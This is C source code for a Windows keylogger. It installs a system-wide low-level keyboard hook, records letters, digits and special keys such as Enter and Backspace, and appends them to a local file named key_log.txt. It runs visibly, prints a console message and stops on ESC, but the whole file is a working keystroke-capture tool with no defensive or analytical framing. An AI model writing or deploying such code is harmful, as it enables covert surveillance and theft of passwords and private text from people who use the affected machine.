#include <stdio.h>
#include <windows.h>
#include <winuser.h>

// Define the name of the log file
#define LOG_FILE "key_log.txt"

// Global handle to the keyboard hook
HHOOK _hook;

// Function to write a string to the log file
void log_key(const char *text) {
    FILE *file = NULL;
    // Open the file in append mode
    file = fopen(LOG_FILE, "a");
    if (file != NULL) {
        fprintf(file, "%s", text);
        fclose(file);
    }
}

// Function to handle keyboard events
// This is the "hook procedure" that the OS calls
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // nCode < 0 means the event must be passed to the next hook in the chain.
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        // Cast the LPARAM to a structure containing key information
        KBDLLHOOKSTRUCT *pKeyStruct = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = pKeyStruct->vkCode; // Virtual Key Code

        // Check for the ESC key to stop the keylogger
        if (vkCode == VK_ESCAPE) {
            log_key("[ESC-STOP]\n");
            // Post a quit message to the application's message queue
            PostQuitMessage(0);
        }

        // --- Key Conversion and Logging ---

        // A better implementation would handle Shift/Ctrl/Alt states
        // and use a function like ToUnicodeEx for accurate character conversion.
        // For simplicity, we'll log the virtual key codes for special keys.

        if ((vkCode >= 0x41 && vkCode <= 0x5A) || (vkCode >= 0x30 && vkCode <= 0x39)) {
            // Log printable characters (A-Z, 0-9).
            // This is a simplification; true character logging is much harder.
            char c = (char)vkCode;
            char key_buffer[2] = {c, '\0'};
            log_key(key_buffer);
        } else {
            // Log special keys
            switch (vkCode) {
                case VK_SPACE: log_key(" "); break;
                case VK_RETURN: log_key("[ENTER]\n"); break;
                case VK_SHIFT: log_key("[SHIFT]"); break;
                case VK_BACK: log_key("[BACKSPACE]"); break;
                case VK_TAB: log_key("[TAB]"); break;
                case VK_CONTROL: log_key("[CTRL]"); break;
                case VK_MENU: log_key("[ALT]"); break;
                case VK_CAPITAL: log_key("[CAPS]"); break;
                // ... more special keys
                default:
                    // Log unknown keys in brackets, like the Python example
                    log_key("[?]");
                    break;
            }
        }
    }

    // Always call the next hook in the chain!
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

// Function to set the keyboard hook
void SetHook() {
    // WH_KEYBOARD_LL: Install a low-level keyboard hook
    // LowLevelKeyboardProc: Pointer to the hook function
    // NULL: hMod - always NULL for low-level hooks
    // 0: dwThreadId - 0 means hook is associated with all existing threads
    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (_hook == NULL) {
        printf("ERROR: Failed to set keyboard hook! (Code: %lu)\n", GetLastError());
    } else {
        printf("Keylogger running... Press ESC to stop.\n");
    }
}

// Function to remove the keyboard hook
void UnHook() {
    UnhookWindowsHookEx(_hook);
}

// Main function
int main() {
    // 1. Set the hook
    SetHook();

    // 2. Start the message loop
    // A keyboard hook requires a message loop to receive events.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        // The loop terminates when PostQuitMessage(0) is called in LowLevelKeyboardProc
    }

    // 3. Unset the hook and exit
    UnHook();
    printf("Keylogger stopped.\n");

    return 0;
}